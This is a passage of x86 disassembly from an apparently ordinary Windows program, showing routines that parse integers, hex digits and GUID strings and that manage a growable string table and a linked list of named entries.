  404360:	mov    edx,DWORD PTR [ebp-0x8]
  404363:	add    ebx,0x10
  404366:	cmp    edi,DWORD PTR [ebp+0xc]
  404369:	jb     0x40434b
  40436b:	jmp    0x404375
  40436d:	mov    esi,edi
  40436f:	shl    esi,0x4
  404372:	add    esi,DWORD PTR [ebp+0x8]
  404375:	pop    ebx
  404376:	pop    edi
  404377:	mov    eax,esi
  404379:	pop    esi
  40437a:	mov    esp,ebp
  40437c:	pop    ebp
  40437d:	ret    0x8
  404380:	int3   
  404381:	int3   
  404382:	int3   
  404383:	int3   
  404384:	int3   
  404385:	mov    edi,edi
  404387:	push   ebp
  404388:	mov    ebp,esp
  40438a:	push   ecx
  40438b:	push   ecx
  40438c:	push   esi
  40438d:	lea    eax,[ebp-0x8]
  404390:	push   eax
  404391:	call   0x403fdc
  404396:	mov    esi,eax
  404398:	test   esi,esi
  40439a:	je     0x4043c6
  40439c:	push   0xa
  40439e:	lea    eax,[ebp-0x4]
  4043a1:	push   eax
  4043a2:	push   esi
  4043a3:	call   DWORD PTR ds:0x409184
  4043a9:	add    esp,0xc
  4043ac:	cmp    DWORD PTR [ebp-0x4],esi
  4043af:	jne    0x4043c9
  4043b1:	push   0x10
  4043b3:	lea    eax,[ebp-0x4]
  4043b6:	push   eax
  4043b7:	push   esi
  4043b8:	call   DWORD PTR ds:0x409184
  4043be:	add    esp,0xc
  4043c1:	cmp    DWORD PTR [ebp-0x4],esi
  4043c4:	jne    0x4043c9
  4043c6:	or     eax,0xffffffff
  4043c9:	pop    esi
  4043ca:	mov    esp,ebp
  4043cc:	pop    ebp
  4043cd:	ret    
  4043ce:	int3   
  4043cf:	int3   
  4043d0:	int3   
  4043d1:	int3   
  4043d2:	int3   
  4043d3:	mov    edi,edi
  4043d5:	push   ebp
  4043d6:	mov    ebp,esp
  4043d8:	sub    esp,0xc
  4043db:	push   ebx
  4043dc:	push   esi
  4043dd:	push   edi
  4043de:	xor    edi,edi
  4043e0:	mov    DWORD PTR [ebp-0x8],ecx
  4043e3:	mov    ebx,edx
  4043e5:	inc    edi
  4043e6:	xor    edx,edx
  4043e8:	mov    DWORD PTR [ebp-0xc],edi
  4043eb:	mov    esi,edx
  4043ed:	mov    DWORD PTR [ebp-0x4],edx
  4043f0:	cmp    DWORD PTR [ebp+0xc],edx
  4043f3:	je     0x404453
  4043f5:	mov    ecx,DWORD PTR [ebp+0xc]
  4043f8:	mov    eax,DWORD PTR [ebp+0x8]
  4043fb:	mov    DWORD PTR [ecx],eax
  4043fd:	mov    ecx,DWORD PTR [ebp-0x8]
  404400:	test   ecx,ecx
  404402:	je     0x404453
  404404:	test   ebx,ebx
  404406:	je     0x404453
  404408:	cmp    WORD PTR [ecx],0x2d
  40440c:	jne    0x404415
  40440e:	or     edi,0xffffffff
  404411:	inc    esi
  404412:	mov    DWORD PTR [ebp-0xc],edi
  404415:	cmp    esi,ebx
  404417:	jae    0x404448
  404419:	mov    edi,DWORD PTR [ebp-0x4]
  40441c:	mov    edx,ecx
  40441e:	movzx  eax,WORD PTR [edx+esi*2]
  404422:	cmp    eax,0x30
  404425:	jb     0x40443b
  404427:	cmp    eax,0x39
  40442a:	ja     0x40443b
  40442c:	imul   ecx,edi,0xa
  40442f:	mov    edi,eax
  404431:	add    edi,0xffffffd0
  404434:	add    edi,ecx
  404436:	inc    esi
  404437:	cmp    esi,ebx
  404439:	jb     0x40441e
  40443b:	mov    DWORD PTR [ebp-0x4],edi
  40443e:	mov    edi,DWORD PTR [ebp-0xc]
  404441:	push   0x0
  404443:	pop    edx
  404444:	cmp    esi,ebx
  404446:	jb     0x404453
  404448:	imul   edi,DWORD PTR [ebp-0x4]
  40444c:	mov    dl,0x1
  40444e:	mov    eax,DWORD PTR [ebp+0xc]
  404451:	mov    DWORD PTR [eax],edi
  404453:	pop    edi
  404454:	pop    esi
  404455:	mov    al,dl
  404457:	pop    ebx
  404458:	mov    esp,ebp
  40445a:	pop    ebp
  40445b:	ret    0x8
  40445e:	int3   
  40445f:	int3   
  404460:	int3   
  404461:	int3   
  404462:	int3   
  404463:	mov    edi,edi
  404465:	push   esi
  404466:	mov    esi,edx
  404468:	xor    edx,edx
  40446a:	test   esi,esi
  40446c:	jne    0x404473
  40446e:	push   0xd
  404470:	pop    edx
  404471:	jmp    0x4044a9
  404473:	lea    eax,[ecx-0x30]
  404476:	mov    BYTE PTR [esi],dl
  404478:	cmp    ax,0x9
  40447c:	ja     0x404485
  40447e:	sub    cl,0x30
  404481:	mov    BYTE PTR [esi],cl
  404483:	jmp    0x4044a9
  404485:	push   edi
  404486:	push   0x5
  404488:	lea    eax,[ecx-0x41]
  40448b:	pop    edi
  40448c:	cmp    ax,di
  40448f:	ja     0x404496
  404491:	sub    cl,0x37
  404494:	jmp    0x4044a1
  404496:	lea    eax,[ecx-0x61]
  404499:	cmp    ax,di
  40449c:	ja     0x4044a5
  40449e:	sub    cl,0x57
  4044a1:	mov    BYTE PTR [esi],cl
  4044a3:	jmp    0x4044a8
  4044a5:	push   0xd
  4044a7:	pop    edx
  4044a8:	pop    edi
  4044a9:	mov    eax,edx
  4044ab:	pop    esi
  4044ac:	ret    
  4044ad:	int3   
  4044ae:	int3   
  4044af:	int3   
  4044b0:	int3   
  4044b1:	int3   
  4044b2:	mov    edi,edi
  4044b4:	push   ebp
  4044b5:	mov    ebp,esp
  4044b7:	sub    esp,0x1c
  4044ba:	push   ebx
  4044bb:	mov    ebx,ecx
  4044bd:	mov    DWORD PTR [ebp-0x18],edx
  4044c0:	mov    edx,DWORD PTR [ebp+0x8]
  4044c3:	xor    ecx,ecx
  4044c5:	mov    DWORD PTR [ebp-0x8],ebx
  4044c8:	mov    DWORD PTR [ebp-0x10],ecx
  4044cb:	push   esi
  4044cc:	mov    esi,ecx
  4044ce:	test   edx,edx
  4044d0:	jne    0x4044d7
  4044d2:	push   0xd
  4044d4:	pop    esi
  4044d5:	jmp    0x40451a
  4044d7:	push   edi
  4044d8:	xor    eax,eax
  4044da:	mov    edi,edx
  4044dc:	stos   DWORD PTR es:[edi],eax
  4044dd:	stos   DWORD PTR es:[edi],eax
  4044de:	stos   DWORD PTR es:[edi],eax
  4044df:	stos   DWORD PTR es:[edi],eax
  4044e0:	test   ebx,ebx
  4044e2:	je     0x40450e
  4044e4:	mov    eax,DWORD PTR [ebp-0x18]
  4044e7:	cmp    eax,0x24
  4044ea:	je     0x4044f1
  4044ec:	cmp    eax,0x26
  4044ef:	jne    0x40450e
  4044f1:	cmp    WORD PTR [ebx],0x7b
  4044f5:	mov    edi,ecx
  4044f7:	mov    DWORD PTR [ebp-0x14],edi
  4044fa:	jne    0x404524
  4044fc:	cmp    eax,0x26
  4044ff:	jne    0x40450e
  404501:	xor    edi,edi
  404503:	mov    eax,ecx
  404505:	inc    edi
  404506:	mov    DWORD PTR [ebp-0xc],eax
  404509:	mov    DWORD PTR [ebp-0x14],edi
  40450c:	jmp    0x404529
  40450e:	push   0xd
  404510:	pop    esi
  404511:	mov    edi,edx
  404513:	xor    eax,eax
  404515:	stos   DWORD PTR es:[edi],eax
  404516:	stos   DWORD PTR es:[edi],eax
  404517:	stos   DWORD PTR es:[edi],eax
  404518:	stos   DWORD PTR es:[edi],eax
  404519:	pop    edi
  40451a:	mov    eax,esi
  40451c:	pop    esi
  40451d:	pop    ebx
  40451e:	mov    esp,ebp
  404520:	pop    ebp
  404521:	ret    0x4
  404524:	mov    eax,ecx
  404526:	mov    DWORD PTR [ebp-0xc],ecx
  404529:	lea    ecx,[ebx+edi*2]
  40452c:	mov    ebx,edx
  40452e:	mov    DWORD PTR [ebp-0x1c],ecx
  404531:	mov    edi,ecx
  404533:	cmp    eax,0x8
  404536:	jae    0x404564
  404538:	mov    cx,WORD PTR [edi]
  40453b:	lea    edx,[ebp-0x1]
  40453e:	call   0x404463
  404543:	mov    esi,eax
  404545:	test   esi,esi
  404547:	jne    0x404556
  404549:	mov    edx,DWORD PTR [ebx]
  40454b:	movzx  ecx,BYTE PTR [ebp-0x1]
  40454f:	shl    edx,0x4
  404552:	add    edx,ecx
  404554:	mov    DWORD PTR [ebx],edx
  404556:	mov    eax,DWORD PTR [ebp-0xc]
  404559:	add    edi,0x2
  40455c:	inc    eax
  40455d:	mov    DWORD PTR [ebp-0xc],eax
  404560:	test   esi,esi
  404562:	je     0x404533
  404564:	mov    edi,DWORD PTR [ebp-0x14]
  404567:	mov    ebx,DWORD PTR [ebp-0x8]
  40456a:	mov    edx,DWORD PTR [ebp+0x8]
  40456d:	test   esi,esi
  40456f:	jne    0x404511
  404571:	push   0x2d
  404573:	pop    eax
  404574:	cmp    WORD PTR [ebx+edi*2+0x10],ax
  404579:	jne    0x40450e
  40457b:	add    edi,0x9
  40457e:	xor    eax,eax
  404580:	mov    DWORD PTR [ebp-0x14],eax
  404583:	lea    ecx,[ebx+edi*2]
  404586:	mov    DWORD PTR [ebp-0x1c],ecx
  404589:	mov    ebx,ecx
  40458b:	cmp    eax,0x4
  40458e:	jae    0x4045c5
  404590:	mov    cx,WORD PTR [ebx]
  404593:	lea    edx,[ebp-0x1]
  404596:	call   0x404463
  40459b:	mov    edx,DWORD PTR [ebp+0x8]
  40459e:	mov    esi,eax
  4045a0:	test   esi,esi
  4045a2:	jne    0x4045b7
  4045a4:	mov    cx,WORD PTR [edx+0x4]
  4045a8:	movzx  eax,BYTE PTR [ebp-0x1]
  4045ac:	shl    cx,0x4
  4045b0:	add    cx,ax
  4045b3:	mov    WORD PTR [edx+0x4],cx
  4045b7:	mov    eax,DWORD PTR [ebp-0x14]
  4045ba:	add    ebx,0x2
  4045bd:	inc    eax
  4045be:	mov    DWORD PTR [ebp-0x14],eax
  4045c1:	test   esi,esi
  4045c3:	je     0x40458b
  4045c5:	mov    ebx,DWORD PTR [ebp-0x8]
  4045c8:	test   esi,esi
  4045ca:	jne    0x404511
  4045d0:	push   0x2d
  4045d2:	pop    eax
  4045d3:	cmp    WORD PTR [ebx+edi*2+0x8],ax
  4045d8:	jne    0x40450e
  4045de:	add    edi,0x5
  4045e1:	xor    eax,eax
  4045e3:	mov    DWORD PTR [ebp-0x14],eax
  4045e6:	lea    ecx,[ebx+edi*2]
  4045e9:	mov    DWORD PTR [ebp-0x1c],ecx
  4045ec:	mov    ebx,ecx
  4045ee:	cmp    eax,0x4
  4045f1:	jae    0x404628
  4045f3:	mov    cx,WORD PTR [ebx]
  4045f6:	lea    edx,[ebp-0x1]
  4045f9:	call   0x404463
  4045fe:	mov    edx,DWORD PTR [ebp+0x8]
  404601:	mov    esi,eax
  404603:	test   esi,esi
  404605:	jne    0x40461a
  404607:	mov    cx,WORD PTR [edx+0x6]
  40460b:	movzx  eax,BYTE PTR [ebp-0x1]
  40460f:	shl    cx,0x4
  404613:	add    cx,ax
  404616:	mov    WORD PTR [edx+0x6],cx
  40461a:	mov    eax,DWORD PTR [ebp-0x14]
  40461d:	add    ebx,0x2
  404620:	inc    eax
  404621:	mov    DWORD PTR [ebp-0x14],eax
  404624:	test   esi,esi
  404626:	je     0x4045ee
  404628:	mov    ebx,DWORD PTR [ebp-0x8]
  40462b:	test   esi,esi
  40462d:	jne    0x404511
  404633:	push   0x2d
  404635:	pop    eax
  404636:	cmp    WORD PTR [ebx+edi*2+0x8],ax
  40463b:	jne    0x40450e
  404641:	add    edi,0x5
  404644:	xor    ecx,ecx
  404646:	mov    eax,ecx
  404648:	mov    DWORD PTR [ebp-0xc],eax
  40464b:	lea    ecx,[ebx+edi*2]
  40464e:	mov    DWORD PTR [ebp-0x1c],ecx
  404651:	mov    ebx,ecx
  404653:	cmp    eax,0x4
  404656:	jae    0x40468d
  404658:	mov    cx,WORD PTR [ebx]
  40465b:	lea    edx,[ebp-0x1]
  40465e:	call   0x404463
  404663:	mov    edx,DWORD PTR [ebp+0x8]
  404666:	mov    esi,eax
  404668:	test   esi,esi
  40466a:	jne    0x40467f
  40466c:	mov    ecx,DWORD PTR [ebp-0xc]
  40466f:	shr    ecx,1
  404671:	mov    al,BYTE PTR [ecx+edx*1+0x8]
  404675:	shl    al,0x4
  404678:	add    al,BYTE PTR [ebp-0x1]
  40467b:	mov    BYTE PTR [ecx+edx*1+0x8],al
  40467f:	mov    eax,DWORD PTR [ebp-0xc]
  404682:	add    ebx,0x2
  404685:	inc    eax
  404686:	mov    DWORD PTR [ebp-0xc],eax
  404689:	test   esi,esi
  40468b:	je     0x404653
  40468d:	mov    ebx,DWORD PTR [ebp-0x8]
  404690:	test   esi,esi
  404692:	jne    0x404511
  404698:	push   0x2d
  40469a:	pop    eax
  40469b:	cmp    WORD PTR [ebx+edi*2+0x8],ax
  4046a0:	jne    0x40450e
  4046a6:	add    edi,0x5
  4046a9:	xor    ecx,ecx
  4046ab:	lea    eax,[ebx+edi*2]
  4046ae:	mov    DWORD PTR [ebp-0x1c],eax
  4046b1:	mov    ebx,eax
  4046b3:	cmp    ecx,0xc
  4046b6:	jae    0x4046ed
  4046b8:	mov    cx,WORD PTR [ebx]
  4046bb:	lea    edx,[ebp-0x1]
  4046be:	call   0x404463
  4046c3:	mov    edx,DWORD PTR [ebp+0x8]
  4046c6:	mov    esi,eax
  4046c8:	test   esi,esi
  4046ca:	jne    0x4046df
  4046cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4046cf:	shr    ecx,1
  4046d1:	mov    al,BYTE PTR [ecx+edx*1+0xa]
  4046d5:	shl    al,0x4
  4046d8:	add    al,BYTE PTR [ebp-0x1]
  4046db:	mov    BYTE PTR [ecx+edx*1+0xa],al
  4046df:	mov    ecx,DWORD PTR [ebp-0x10]
  4046e2:	add    ebx,0x2
  4046e5:	inc    ecx
  4046e6:	mov    DWORD PTR [ebp-0x10],ecx
  4046e9:	test   esi,esi
  4046eb:	je     0x4046b3
  4046ed:	mov    ebx,DWORD PTR [ebp-0x8]
  4046f0:	test   esi,esi
  4046f2:	jne    0x404511
  4046f8:	add    edi,0xc
  4046fb:	cmp    edi,DWORD PTR [ebp-0x18]
  4046fe:	jae    0x404519
  404704:	cmp    WORD PTR [ebx+edi*2],0x7d
  404709:	je     0x404519
  40470f:	jmp    0x40450e
  404714:	int3   
  404715:	int3   
  404716:	int3   
  404717:	int3   
  404718:	int3   
  404719:	mov    edi,edi
  40471b:	push   ebp
  40471c:	mov    ebp,esp
  40471e:	sub    esp,0xc
  404721:	push   ebx
  404722:	push   esi
  404723:	mov    eax,ecx
  404725:	mov    ebx,edx
  404727:	xor    esi,esi
  404729:	mov    DWORD PTR [ebp-0xc],ebx
  40472c:	mov    DWORD PTR [ebp-0x8],eax
  40472f:	push   edi
  404730:	test   eax,eax
  404732:	jne    0x40473c
  404734:	push   0x57
  404736:	pop    esi
  404737:	jmp    0x404869
  40473c:	mov    ecx,DWORD PTR ds:0x4083b4
  404742:	test   ecx,ecx
  404744:	jne    0x40478b
  404746:	push   0x20000
  40474b:	push   0x8
  40474d:	mov    DWORD PTR ds:0x4083ac,0x10000
  404757:	mov    DWORD PTR ds:0x4083b8,esi
  40475d:	call   DWORD PTR ds:0x409050
  404763:	push   eax
  404764:	call   DWORD PTR ds:0x409048
  40476a:	mov    ecx,eax
  40476c:	mov    DWORD PTR ds:0x4083b4,ecx
  404772:	test   ecx,ecx
  404774:	jne    0x40478b
  404776:	push   0x4f1
  40477b:	push   0x2
  40477d:	push   0x66
  40477f:	call   0x4068f5
  404784:	add    esp,0xc
  404787:	push   0xe
  404789:	jmp    0x404736
  40478b:	mov    edi,DWORD PTR ds:0x4083b8
  404791:	lea    eax,[edi+0x1]
  404794:	add    eax,ebx
  404796:	mov    DWORD PTR [ebp-0x4],eax
  404799:	cmp    eax,edi
  40479b:	ja     0x4047b8
  40479d:	push   0x4fa
  4047a2:	push   0x2
  4047a4:	push   0x66
  4047a6:	call   0x4068f5
  4047ab:	add    esp,0xc
  4047ae:	mov    esi,0x216
  4047b3:	jmp    0x404869
  4047b8:	mov    ebx,DWORD PTR ds:0x4083ac
  4047be:	cmp    eax,ebx
  4047c0:	jbe    0x40484d
  4047c6:	push   0x2
  4047c8:	mov    edi,ebx
  4047ca:	pop    edx
  4047cb:	cmp    edi,eax
  4047cd:	ja     0x4047e8
  4047cf:	mov    eax,edi
  4047d1:	mul    edx
  4047d3:	mov    edi,eax
  4047d5:	mov    eax,edx
  4047d7:	sar    eax,0x1f
  4047da:	test   edx,edx
  4047dc:	jne    0x404833
  4047de:	mov    eax,DWORD PTR [ebp-0x4]
  4047e1:	push   0x2
  4047e3:	pop    edx
  4047e4:	cmp    edi,ebx
  4047e6:	jae    0x4047cb
  4047e8:	cmp    edi,ebx
  4047ea:	jbe    0x404872
  4047f0:	mov    eax,edi
  4047f2:	mul    edx
  4047f4:	mov    eax,edx
  4047f6:	sar    eax,0x1f
  4047f9:	test   edx,edx
  4047fb:	jne    0x404872
  4047fd:	lea    eax,[edi+edi*1]
  404800:	mov    ebx,ecx
  404802:	push   eax
  404803:	push   ebx
  404804:	push   0x8
  404806:	call   DWORD PTR ds:0x409050
  40480c:	push   eax
  40480d:	call   DWORD PTR ds:0x40904c
  404813:	mov    ecx,eax
  404815:	mov    DWORD PTR ds:0x4083b4,ecx
  40481b:	test   ecx,ecx
  40481d:	jne    0x404841
  40481f:	push   0x519
  404824:	push   0x2
  404826:	pop    eax
  404827:	mov    DWORD PTR ds:0x4083b4,ebx
  40482d:	push   eax
  40482e:	jmp    0x40477d
  404833:	push   0x505
  404838:	push   0x2
  40483a:	pop    eax
  40483b:	push   eax
  40483c:	jmp    0x4047a4
  404841:	mov    DWORD PTR ds:0x4083ac,edi
  404847:	mov    edi,DWORD PTR ds:0x4083b8
  40484d:	mov    ebx,DWORD PTR [ebp-0xc]
  404850:	lea    ecx,[ecx+edi*2]
  404853:	push   DWORD PTR [ebp-0x8]
  404856:	lea    edx,[ebx+0x1]
  404859:	call   0x4039a4
  40485e:	lea    ecx,[ebx+0x1]
  404861:	add    ecx,edi
  404863:	mov    DWORD PTR ds:0x4083b8,ecx
  404869:	pop    edi
  40486a:	mov    eax,esi
  40486c:	pop    esi
  40486d:	pop    ebx
  40486e:	mov    esp,ebp
  404870:	pop    ebp
  404871:	ret    
  404872:	push   0x510
  404877:	jmp    0x404838
  404879:	int3   
  40487a:	int3   
  40487b:	int3   
  40487c:	int3   
  40487d:	int3   
  40487e:	mov    edi,edi
  404880:	push   ebp
  404881:	mov    ebp,esp
  404883:	sub    esp,0x10
  404886:	and    DWORD PTR [ebp-0x4],0x0
  40488a:	push   ebx
  40488b:	push   esi
  40488c:	mov    esi,DWORD PTR ds:0x4083b0
  404892:	mov    ebx,ecx
  404894:	push   edi
  404895:	mov    edi,edx
  404897:	test   ebx,ebx
  404899:	jne    0x40493e
  40489f:	xor    esi,esi
  4048a1:	jmp    0x404a1e
  4048a6:	mov    ecx,DWORD PTR [esi+0x8]
  4048a9:	cmp    ecx,DWORD PTR ds:0x4083ac
  4048af:	jae    0x40493c
  4048b5:	mov    eax,ds:0x4083b4
  4048ba:	lea    eax,[eax+ecx*2]
  4048bd:	push   eax
  4048be:	mov    DWORD PTR [ebp-0x8],eax
  4048c1:	call   DWORD PTR ds:0x4090e4
  4048c7:	mov    edx,eax
  4048c9:	cmp    edx,edi
  4048cb:	mov    DWORD PTR [ebp-0xc],edx
  4048ce:	sete   cl
  4048d1:	test   cl,cl
  4048d3:	je     0x4048f5
  4048d5:	push   edi
  4048d6:	push   DWORD PTR [ebp-0x8]
  4048d9:	push   ebx
  4048da:	call   DWORD PTR ds:0x409170
  4048e0:	add    esp,0xc
  4048e3:	mov    ecx,eax
  4048e5:	neg    ecx
  4048e7:	sbb    cl,cl
  4048e9:	add    cl,0x1
  4048ec:	jne    0x404977
  4048f2:	mov    edx,DWORD PTR [ebp-0xc]
  4048f5:	cmp    edx,0xa
  4048f8:	jbe    0x404910
  4048fa:	cmp    edi,edx
  4048fc:	jae    0x404910
  4048fe:	lea    eax,[edi+0xa]
  404901:	cmp    eax,edx
  404903:	jne    0x404910
  404905:	mov    eax,DWORD PTR [ebp-0x8]
  404908:	push   edi
  404909:	add    eax,0x12
  40490c:	push   eax
  40490d:	push   ebx
  40490e:	jmp    0x404928
  404910:	cmp    edi,0xa
  404913:	jbe    0x404938
  404915:	cmp    edx,edi
  404917:	jae    0x404938
  404919:	lea    eax,[edx+0xa]
  40491c:	cmp    eax,edi
  40491e:	jne    0x404938
  404920:	push   edx
  404921:	push   DWORD PTR [ebp-0x8]
  404924:	lea    eax,[ebx+0x12]
  404927:	push   eax
  404928:	call   DWORD PTR ds:0x409170
  40492e:	add    esp,0xc
  404931:	neg    eax
  404933:	sbb    al,al
  404935:	lea    ecx,[eax+0x1]
  404938:	test   cl,cl
  40493a:	jne    0x404977
  40493c:	mov    esi,DWORD PTR [esi]
  40493e:	test   esi,esi
  404940:	jne    0x4048a6
  404946:	push   0x18
  404948:	push   0x8
  40494a:	call   DWORD PTR ds:0x409050
  404950:	push   eax
  404951:	call   DWORD PTR ds:0x409048
  404957:	mov    esi,eax
  404959:	test   esi,esi
  40495b:	jne    0x404a68
  404961:	push   0x578
  404966:	push   0x2
  404968:	push   0x66
  40496a:	call   0x4068f5
  40496f:	add    esp,0xc
  404972:	jmp    0x404a1e
  404977:	cmp    DWORD PTR [ebp+0x8],0x0
  40497b:	je     0x404a59
  404981:	mov    ecx,DWORD PTR [esi+0xc]
  404984:	cmp    ecx,DWORD PTR ds:0x4083ac
  40498a:	jae    0x404a59
  404990:	mov    eax,ds:0x4083b4
  404995:	lea    eax,[eax+ecx*2]
  404998:	push   eax
  404999:	mov    DWORD PTR [ebp-0xc],eax
  40499c:	call   DWORD PTR ds:0x4090e4
  4049a2:	cmp    eax,DWORD PTR [ebp+0xc]
  4049a5:	jne    0x404a39
  4049ab:	push   DWORD PTR [ebp+0xc]
  4049ae:	push   DWORD PTR [ebp+0x8]
  4049b1:	push   DWORD PTR [ebp-0xc]
  4049b4:	call   DWORD PTR ds:0x409170
  4049ba:	add    esp,0xc
  4049bd:	test   eax,eax
  4049bf:	jne    0x404a39
  4049c1:	cmp    DWORD PTR [esi+0x14],eax
  4049c4:	jne    0x404a29
  4049c6:	mov    eax,DWORD PTR [ebp+0x10]
  4049c9:	mov    DWORD PTR [esi+0x14],eax
  4049cc:	mov    ebx,DWORD PTR [ebp-0x4]
  4049cf:	mov    eax,DWORD PTR [esi+0xc]
  4049d2:	cmp    eax,DWORD PTR ds:0x4083ac
  4049d8:	jb     0x404a0f
  4049da:	cmp    DWORD PTR [ebp+0x8],0x0
  4049de:	je     0x404a0f
  4049e0:	mov    eax,ds:0x4083b8
  4049e5:	mov    edx,DWORD PTR [ebp+0xc]
  4049e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4049eb:	mov    DWORD PTR [esi+0xc],eax
  4049ee:	call   0x404719
  4049f3:	mov    ebx,eax
  4049f5:	test   ebx,ebx
  4049f7:	je     0x404a0f
  4049f9:	or     DWORD PTR [esi+0xc],0xffffffff
  4049fd:	push   esi
  4049fe:	push   0x0
  404a00:	call   DWORD PTR ds:0x409050
  404a06:	push   eax
  404a07:	call   DWORD PTR ds:0x409054
  404a0d:	xor    esi,esi
  404a0f:	test   esi,esi
  404a11:	jne    0x404a1e
  404a13:	test   ebx,ebx
  404a15:	jne    0x404a1e
  404a17:	push   ebx
  404a18:	call   DWORD PTR ds:0x409014
  404a1e:	pop    edi
  404a1f:	mov    eax,esi
  404a21:	pop    esi
  404a22:	pop    ebx
  404a23:	mov    esp,ebp
  404a25:	pop    ebp
  404a26:	ret    0xc
  404a29:	mov    ebx,DWORD PTR [ebp-0x4]
  404a2c:	xor    eax,eax
  404a2e:	inc    eax
  404a2f:	cmp    DWORD PTR [ebp+0x10],eax
  404a32:	jne    0x4049cf
  404a34:	mov    DWORD PTR [esi+0x14],eax
  404a37:	jmp    0x4049cf
  404a39:	movzx  esi,WORD PTR [ebx+edi*2]
  404a3d:	xor    eax,eax
  404a3f:	push   ebx
  404a40:	push   0x1
  404a42:	push   0x72
  404a44:	mov    WORD PTR [ebx+edi*2],ax
  404a48:	call   0x4068f5
  404a4d:	add    esp,0xc
  404a50:	mov    WORD PTR [ebx+edi*2],si
  404a54:	jmp    0x40489f
  404a59:	cmp    DWORD PTR [esi+0x14],0x0
  404a5d:	jne    0x4049cc
  404a63:	jmp    0x4049c6
  404a68:	mov    eax,ds:0x4083b8
  404a6d:	mov    edx,edi
  404a6f:	mov    ecx,ebx
  404a71:	mov    DWORD PTR [esi+0x8],eax
  404a74:	call   0x404719
  404a79:	mov    ebx,eax
  404a7b:	test   ebx,ebx
  404a7d:	jne    0x4049fd
  404a83:	mov    ecx,DWORD PTR ds:0x40804c
  404a89:	or     DWORD PTR [esi+0xc],0xffffffff
  404a8d:	mov    eax,ds:0x4083b0
  404a92:	mov    DWORD PTR [esi+0x10],ecx
  404a95:	add    ecx,0x2
  404a98:	mov    DWORD PTR ds:0x40804c,ecx
  404a9e:	mov    ecx,DWORD PTR [ebp+0x10]
  404aa1:	mov    DWORD PTR [esi+0x14],ecx
  404aa4:	mov    DWORD PTR [esi],eax
  404aa6:	mov    DWORD PTR ds:0x4083b0,esi
  404aac:	jmp    0x4049cf
  404ab1:	int3   
  404ab2:	int3   
  404ab3:	int3   
  404ab4:	int3   
  404ab5:	int3   
  404ab6:	mov    edi,edi
  404ab8:	push   ebp
  404ab9:	mov    ebp,esp
  404abb:	push   ecx
  404abc:	push   ecx
  404abd:	push   ebx
  404abe:	push   esi
  404abf:	push   edi
  404ac0:	mov    edi,ecx
  404ac2:	mov    DWORD PTR [ebp-0x4],edx
  404ac5:	test   edi,edi
  404ac7:	je     0x404b08
  404ac9:	mov    esi,DWORD PTR ds:0x4083b0
  404acf:	jmp    0x404b04
  404ad1:	mov    ecx,DWORD PTR [esi+0x8]
  404ad4:	cmp    ecx,DWORD PTR ds:0x4083ac
  404ada:	jae    0x404b02
  404adc:	mov    eax,ds:0x4083b4
  404ae1:	lea    ebx,[eax+ecx*2]
  404ae4:	push   ebx
  404ae5:	call   DWORD PTR ds:0x4090e4
  404aeb:	mov    edx,DWORD PTR [ebp-0x4]
  404aee:	cmp    eax,edx
  404af0:	jne    0x404b02
  404af2:	push   edx
  404af3:	push   ebx
  404af4:	push   edi
  404af5:	call   DWORD PTR ds:0x409170
  404afb:	add    esp,0xc
  404afe:	test   eax,eax
  404b00:	je     0x404b34
  404b02:	mov    esi,DWORD PTR [esi]
  404b04:	test   esi,esi
  404b06:	jne    0x404ad1
  404b08:	push   0x18
  404b0a:	push   0x8
  404b0c:	call   DWORD PTR ds:0x409050
  404b12:	push   eax
  404b13:	call   DWORD PTR ds:0x409048
  404b19:	mov    esi,eax
  404b1b:	test   esi,esi
  404b1d:	jne    0x404b71
  404b1f:	push   0x607
  404b24:	push   0x2
  404b26:	push   0x66
  404b28:	call   0x4068f5
  404b2d:	add    esp,0xc
  404b30:	push   0xe
  404b32:	jmp    0x404b54
  404b34:	cmp    DWORD PTR [ebp+0x8],0x0
  404b38:	je     0x404b57
  404b3a:	mov    eax,DWORD PTR [esi+0xc]
  404b3d:	cmp    eax,DWORD PTR ds:0x4083ac
  404b43:	jae    0x404b57
  404b45:	push   ebx
  404b46:	push   0x1
  404b48:	push   0x72
  404b4a:	call   0x4068f5
  404b4f:	add    esp,0xc
  404b52:	push   0xd
  404b54:	pop    eax
  404b55:	jmp    0x404bd3
  404b57:	mov    ecx,DWORD PTR [ebp+0x10]
  404b5a:	test   ecx,ecx
  404b5c:	je     0x404bb6
  404b5e:	mov    eax,DWORD PTR [esi+0x14]
  404b61:	sub    eax,0x0
  404b64:	je     0x404b6c
  404b66:	dec    eax
  404b67:	sub    eax,0x1
  404b6a:	jne    0x404bb6
  404b6c:	mov    DWORD PTR [esi+0x14],ecx
  404b6f:	jmp    0x404bb6
  404b71:	mov    eax,ds:0x4083b0
  404b76:	or     DWORD PTR [esi+0x8],0xffffffff
  404b7a:	or     DWORD PTR [esi+0xc],0xffffffff
  404b7e:	mov    DWORD PTR [esi],eax
  404b80:	mov    eax,ds:0x40804c
  404b85:	mov    DWORD PTR [esi+0x10],eax
  404b88:	add    eax,0x2
  404b8b:	mov    ds:0x40804c,eax
  404b90:	mov    eax,DWORD PTR [ebp+0x10]
  404b93:	mov    DWORD PTR ds:0x4083b0,esi
  404b99:	mov    DWORD PTR [esi+0x14],eax
  404b9c:	test   edi,edi
  404b9e:	je     0x404bb6
  404ba0:	mov    eax,ds:0x4083b8
  404ba5:	mov    ecx,edi
  404ba7:	mov    edx,DWORD PTR [ebp-0x4]
  404baa:	mov    DWORD PTR [esi+0x8],eax
  404bad:	call   0x404719
  404bb2:	test   eax,eax
  404bb4:	jne    0x404bd3
  404bb6:	cmp    DWORD PTR [ebp+0x8],0x0
  404bba:	je     0x404bdc
  404bbc:	mov    eax,ds:0x4083b8
  404bc1:	mov    edx,DWORD PTR [ebp+0xc]
  404bc4:	mov    ecx,DWORD PTR [ebp+0x8]
  404bc7:	mov    DWORD PTR [esi+0xc],eax
  404bca:	call   0x404719
  404bcf:	test   eax,eax
  404bd1:	je     0x404bdc
  404bd3:	push   eax
  404bd4:	xor    esi,esi
  404bd6:	call   DWORD PTR ds:0x409014
  404bdc:	pop    edi
  404bdd:	mov    eax,esi
  404bdf:	pop    esi
  404be0:	pop    ebx
  404be1:	mov    esp,ebp
  404be3:	pop    ebp
  404be4:	ret    0xc
  404be7:	int3   
  404be8:	int3   
  404be9:	int3   
  404bea:	int3   
  404beb:	int3   
  404bec:	mov    edi,edi
  404bee:	push   ebp
  404bef:	mov    ebp,esp
  404bf1:	push   ecx
  404bf2:	push   ebx
  404bf3:	push   esi
  404bf4:	push   edi
